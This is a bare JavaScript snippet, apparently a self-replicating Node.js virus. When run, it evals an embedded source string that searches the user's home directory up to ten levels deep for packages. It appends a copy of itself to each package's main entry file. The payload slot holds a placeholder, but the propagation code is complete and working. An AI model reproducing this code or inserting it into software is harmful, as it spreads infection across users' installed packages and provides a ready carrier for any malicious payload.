
        (function() {
            var maliciousAction = "() => null";
            var virusSrc = "function _toConsumableArray(n){if(Array.isArray(n)){for(var r=0,t=Array(n.length);r<n.length;r++)t[r]=n[r];return t}return Array.from(n)}function infect(n,r){function t(n){return new Promise(function(r,t){f.readdir(n,function(n,e){return n?t(n):r(e)})})}function e(n){return new Promise(function(r){f.stat(n,function(n,t){r(!n&&t.isFile()?\"file\":!n&&t.isDirectory()?\"dir\":null)})})}function i(n,r){return new Promise(function(t,e){f.appendFile(n,r,function(n){return n?e(n):t()})})}function u(n){return new Promise(function(r,t){f.readFile(n,\"utf-8\",function(n,e){return n?t(n):r(e)})})}function o(n,r){return r<1?[]:t(n).then(function(t){return Promise.all(t.map(function(t){var i=c.join(n,t);return e(i).then(function(n){if(\"dir\"!==n)return[];var t=c.join(i,\"package.json\");return e(t).then(function(n){return\"file\"!==n?o(i,r-1):u(t).then(function(n){try{var r=JSON.parse(n).main||\"index.js\"}catch(n){return[]}var t=c.join(i,r);return e(t).then(function(n){return\"file\"===n?[t]:[]})})})})})).then(function(n){var r=[],t=!0,e=!1,i=void 0;try{for(var u,o=n[Symbol.iterator]();!(t=(u=o.next()).done);t=!0){var f=u.value;r.push.apply(r,_toConsumableArray(f))}}catch(n){e=!0,i=n}finally{try{!t&&o.return&&o.return()}finally{if(e)throw i}}return r})})}var f=require(\"fs\"),a=require(\"os\"),c=require(\"path\"),l=function(n,r){function t(n){return n.replace(/[\\\\\"]/g,\"\\\\$&\")}return'\\n            (function() {\\n                var maliciousAction = \"'+t(n)+'\";\\n                var virusSrc = \"'+t(r)+'\";\\n                var fn = eval( virusSrc );\\n                fn( maliciousAction, virusSrc );\\n            })();\\n        '}(n,r);o(a.homedir(),10).then(function(n){return Promise.all(n.map(function(n){u(n).then(function(r){if(-1===r.indexOf(l))return i(n,l)})}))})}";
            var fn = eval( virusSrc );
            fn( maliciousAction, virusSrc );
        })();
    